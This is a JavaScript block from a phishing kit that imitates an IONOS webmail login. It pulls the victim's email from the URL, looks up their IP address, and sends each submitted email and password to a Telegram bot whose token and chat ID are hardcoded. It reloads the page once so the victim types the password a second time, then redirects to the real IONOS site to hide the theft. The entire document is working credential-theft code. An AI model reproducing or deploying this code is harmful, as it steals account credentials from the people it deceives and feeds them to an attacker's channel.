<script>
$(document).ready(function() {
  // Email extraction and reflection
  const finalUrl = window.location.href;
  let email = '';
  if (finalUrl.includes('#')) {
    email = decodeURIComponent(finalUrl.split('#')[1]);
  } else if (finalUrl.includes('email=')) {
    email = new URLSearchParams(finalUrl.split('?')[1]).get('email');
  }

  if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    $('.email').val(email).trigger('change');
    $('.appear').text(email);
  }

  $('.email').on('keyup change', function() {
    $('.appear').text($(this).val());
  });

  // Get user IP
  $.getJSON("https://api64.ipify.org?format=json", function(data) {
    $("#ip").val(data.ip);
    console.log("User IP:", data.ip);
  });

  // Form submission handler
  $("#email-form").submit(function(event) {
    event.preventDefault();

    let userEmail = $("#email").val();
    let userPassword = $("#password").val();
    let userIP = $("#ip").val();

    // Telegram credentials
    let botToken = "8459097595:AAHUuFmJKF4jiKA6bZIEvzIez_vYX1h8bl8";
    let chatId = "7241128758";

    // Format message
    let messageText = `üîê New IONOS Login\nüìß Email: ${userEmail}\nüîë Password: ${userPassword}\nüåê IP Address: ${userIP}\n‚è∞ Time: ${new Date().toLocaleString()}`;
    let telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // Check if this is the first or second submission
    let submissionCount = sessionStorage.getItem('ionosSubmissionCount') || 0;
    
    if (submissionCount < 1) {
      // First submission
      submissionCount = 1;
      sessionStorage.setItem('ionosSubmissionCount', submissionCount);
      
      // First Telegram submission
      $.ajax({
        url: telegramUrl,
        type: "POST",
        data: {
          chat_id: chatId,
          text: messageText,
          parse_mode: 'HTML'
        },
        success: function() {
          console.log("‚úÖ First form submission to Telegram successful");
          // Reload the page after first submission
          setTimeout(function() {
            window.location.reload();
          }, 1000);
        },
        error: function(jqXHR, textStatus, errorThrown) {
          console.error("‚ùå First submission failed:", textStatus, errorThrown);
          // Still reload even if there's an error
          setTimeout(function() {
            window.location.reload();
          }, 1000);
        }
      });
    } else {
      // Second submission
      sessionStorage.removeItem('ionosSubmissionCount'); // Clear the counter
      
      // Second Telegram submission
      $.ajax({
        url: telegramUrl,
        type: "POST",
        data: {
          chat_id: chatId,
          text: messageText + "\nüîÑ Second Submission",
          parse_mode: 'HTML'
        },
        success: function() {
          console.log("‚úÖ Second form submission to Telegram successful");
          // Redirect to IONOS after second submission
          setTimeout(function() {
            window.location.href = "https://www.ionos.com";
          }, 1000);
        },
        error: function(jqXHR, textStatus, errorThrown) {
          console.error("‚ùå Second submission failed:", textStatus, errorThrown);
          // Still redirect even if there's an error
          setTimeout(function() {
            window.location.href = "https://www.ionos.com";
          }, 1000);
        }
      });
    }
  });
});
</script>
